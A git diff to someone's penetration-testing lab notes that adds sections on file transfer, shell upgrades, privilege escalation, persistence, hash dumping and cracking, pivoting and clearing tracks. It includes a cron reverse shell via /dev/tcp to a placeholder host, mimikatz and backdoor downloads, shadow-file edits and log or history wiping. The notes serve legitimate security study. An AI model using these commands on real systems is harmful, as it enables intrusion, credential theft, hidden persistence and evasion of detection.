@@ -654,7 +654,7 @@ set RHOSTS victim2
 set PORTS 1-100
 
 sessions 1 
-portfwd add -l 1234 -p 80 -r victim2
+portfwd add -l 1234 -p 80 -r <ip address victim2>
 background
 db_nmap -sS -sV -p 1234 localhost
 search badblue
@@ -689,11 +689,12 @@ username and password provided in lab
 upgrade to meterpreter
 /bin/bash -i
 ps aux
+cat /bin/check-down
 chkrootkit -V
 
 search chkrootkit
 set CHKROOTKIT /bin/chkrootkit
-set LHOST ?
+set LHOST <hostip>
 
 whoami
 ```
@@ -713,7 +714,7 @@ sessions 2
 shell
 /bin/bash -i
 passwd root
-useradd -m jan -s /bin/bash
+useradd -m user -s /bin/bash
 
 >hashdump run
 ```
@@ -757,6 +758,7 @@ ssh -i ssh_key root@ipaddress
 
 ### Armitage
 run armitage in metasploit, easy pesay.
+
 
 # Exploitation
 PTES Penetration Testing Execution Standard
@@ -926,7 +928,7 @@ ftp 1.1.1.1 21
 hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P .../unix_passwords.txt 1.1.1.1 ftp
 hydra -l vagrant -P .../unix_users.txt 1.1.1.1 ftp
 
-msfvenom -p windows/shell/reverse_tcp LHOST=hostip LPORT=1234 -f asp > shell.aspx
+msfvenom -p windows/shell/reverse_tcp LHOST=hostip LPORT=1234 -f aspx > shell.aspx
 >login with ftp
 put shell.aspx
 
@@ -1214,7 +1216,6 @@ schtasks /query /fo LIST (copy and paste results for later)
 schtasks /query /fo LIST /v (verbose)
 ```
 
-
 **Automating Windows Local Enumeration**
 JAWS - Just Another Windows (Enum) Script. Powershell script written in PowerShell 2.0. 
 411Hall/JAWS on Github. Copy the code to lab environment with ctrl+shift+alt.
@@ -1352,7 +1353,7 @@ id
 whoami
 cat /etc/passwd
 chmod +x LinEnum.sh
-./LinEnum.shv
+./LinEnum.sh
 ```
 
 ## Transferring Files
@@ -1367,18 +1368,283 @@ python3 -m http.server 80
 
 **Transferring Files To Windows Targets**
 ```
+searchsploit -m <rejetto>
+> might not work on first try
+cd /usr/share/windows-resources/...mimikatz
+> set up http server on target
+nc -nvlp 1234
 
+cd C:\\
+mkdir Temp
+
+certutil -urlcache -f http://<host>/mimikatz.exe mimikatz.exe
+
+.\mimikatz.exe
+privilege::debug
 ```
 
+**Transferring Files To Linux Targets**
+```
+tmux
+ctrl+b+c
+ctrl+b+0
+ctrl+b+pageup
 
+/bin/bash -i
 
+> host
+cd /usr/share/webshells/php/
+python -m http.server 80
 
+> target
+wget http://<host>/php-backdoor.php
+```
 
+## Shells
+**Upgrading Non-Interactive Shells**
+Pertinent to Linux.
+```
+cat /etc/shells
+/bin/sh -i
+/bin/bash -i
 
+python --version
+python -c 'ïmport pty; pty.spawn("/bin/bash")'
+perl --help
+perl -e 'exec "/bin/bash";'
+ruby: exec "/bin/bash"
+perl: exec "/bin/bash";
+env
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+export TERM=xterm
+export SHELL=bash
+```
 
+## Escalation
+**Identifying Windows Privilege Escalation Vulnerabilities**
+Github itm4n/PrivescCheck.
+```
+search web_delivery
+set TARGET PSH\ (Binary)
+set payload windows/shell/reverse_tcp
+set PSH-EndcodedCommand false
+set LHOST eth1
+> copy powershell code
 
+> on target, run code, check sessions on host
+search shell_to_meterpreter
+set LHOST eth1
+set SESSION 1
+set WIN_TRANSFER VBS
+> make sure lport is different
+sessions 2
+ps
+migrate <explorer.exe>
+getuid
+getprivs
+cd C:\\Users\Student\Desktop\PrivescCheck
+dir
+shell
+> Copy command from PrivescCheck from Github ctrl+shift+alt
+```
 
+**Windows Privilege Escalation**
+```
+psexec.py Administrator@1.1.1.1
 
+search psexec (exploit/windows/smb)
+set LPORT 4422
+set SMBUser administrator
+set SMBPass hello_123321
+```
 
+**Linux Privilege Escalation - Weak Permissions**
+```
+cat /etc/passwd
+cat /etc/group
+groups student
 
+find / -not -type l -perm -o+w
+cat /etc/shadow
+ls -al /etc/shadow
+openssl passwd -1 -salt abc password
+nano /etc/shadow
+> replace asterix of root user with password
+su
+id
+whoami
+```
+
+**Linux Privilege Escalation - SUDO Privileges**
+```
+sudo -l
+sudo  man ls
+!/bin/bash
+cd /root
+id
+```
+
+## Persistence
+### Windows Persistence
+**Persistence Via Services**
+Techniques to keep access to systems across restarts, changed credentials and other interruptions. MITRE ATT&CK knowledge base.
+```
+search persistence_service
+set LPORT 4433
+set SESSION 1
+> remember to delete artifacts after penetration test
+
+use multi/handler
+set payload ...reverse_tcp
+set LHOST eth1
+set LPORT 4433
+```
+
+**Persistence Via RDP**
+```
+pgrep explorer
+migrate <id>
+run getgui -e -u user123 -p pass123
+xfreerdp /u:user123 /p:pass123 /v:1.1.1.1
+```
+
+### Linux Persistence
+**Persistence Via SSH Keys**
+```
+ssh student@1.1.1.1
+> password provided for lab
+
+ls -al
+cat wait
+cd .ssh/
+ls
+cat id_rsa
+cat authorized_keys
+
+scp student@1.1.1.1:~/.ssh/id_rsa .
+chmod +400 id_rsa
+rm wait
+
+ssh -i id_rsa student@1.1.1.1
+```
+
+**Persistence Via Cron Jobs**
+```
+cat /etc/cron*
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<host>/<port> 0>&1'" > cron
+crontab -i cron
+crontab -l
+
+nc -nvlp 1234
+```
+
+## Dumping & Cracking
+### Dumping & Cracking Windows Hashes
+**Dumping & Cracking NTLM Hashes**
+Windows OS stores hashed user account passwords locally in the SAM (Security Accounts Manager) database.
+Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA).
+SAM database file cannot be copied while the OS is running. Can dump SAM hashes with in-memory techniques and tools from the LSASS 
+process. SAM database is encrypted with a syskey in modern versions of Windows. Need Elevated/Administrative privileges to access and interact with LSASS. NTLM (NTHash) from Windows Vista onwards.
+Dump with meterpreter hashdump or Mimikatz. Crack with John the Ripper or Hashcat.
+```
+pgrep lsass
+migrate <id>
+hashdump
+shell
+net user
+
+cd Desktop
+vim hashes.txt
+> paste in hashes from hashdump
+john --list=formats | grep NT
+john --format=NT hashes.txt
+> remember to save the credentials somewhere
+gzip -d /usr/share/wordlists/tockyou.txt.gz
+john --format=NT hashes.txt --wordlist=..rockyou.txt
+
+hashcat --help
+hashcat -a 3 -m 1000 hashes.txt ..rockyou.txt
+nmap -p 3389 1.1.1.1
+xfreerdp ...
+```
+### Dumping & Cracking Linux Hashes
+**Dumping & Cracking Linux Password Hashes**
+Linux has multi-user support. All information for all accounts is stored in the passwd file. This file is encrypted. Encrypted password in the shadow file. Only accessed by the root account or group. Different hashing algorithms. MD5, Blowfish, SHA-256, SHA-512 -> $1, $2, $5, $6. 
+```
+/bin/bash -i
+cat /etc/shadow
+> Copy the entire hash of root user
+sessions -u 1
+
+search hashdump (post/linux/gather/hashdump)
+> remember the path to the saved file
+
+gzip -d ...rockyou
+john --format=sha512crypt <path-to-hash> --wordlist=...rockyou.txt
+hashcat --help | grep 1800
+hashcat -a3 -m 1800 <filepath> ....rockyou.txt
+```
+
+## Pivoting lesson
+**Pivoting**
+Use compromised host to exploit other hosts on a private internal network to which we could not access previously. Meterpreter provides us ability to add network route to the internal network's subnet, perform portforwarding and consequently scan and exploit other systems on the network.
+Port forwarding is the process of redirecting traffic from a specific port on a target system to a specific port on our system. 
+```
+ipconfig
+run autoroute -s 1.1.1.0/20
+run autoroute -p
+search portscan (tcp)
+set RHOSTS <victim2>
+set PORTS 1-100
+
+sessions 1
+portfwd add -l 1234 -p 80 -r <victim2>
+
+nmap -sV -p 1234 localhost
+
+search BadBlue
+set PAYLOAD windows/meterpreter/bind_tcp
+set RHOSTS <victim2>
+
+sysinfo
+
+sessions
+```
+
+## Clearing
+
+**Clearing Your Tracks On Windows**
+MSF is notorious for generating and storing artifacts on the target system when using exploit or post modules. Can delete Windows Event Log, but should be avoided during a penetration test since it stores a lot of data that is important to the client. Some well designed MSF modules provide instructions and resource scripts to remove artifacts.
+```
+use badblue_passthru
+show advanced
+
+pgrep explorer
+
+cd C:\\ 
+mkdir Temp
+pwd
+upload ...nc.exe
+rm nc.exe
+
+search persistence_service platform:windows
+set LPORT 4433
+show info
+> Module creates Cleanup Meterpreter RC file
+
+sessions 1
+resource <path to resource script>
+
+clearev (stay away from this, will delete the event log)
+```
+
+**Clearing Your Tracks On Linux**
+```
+/bin/bash -i
+cd /tmp
+history
+> remember to delete or edit bash history file if it exists
+history -c
+cat /dev/null > .bash_history
+```
 
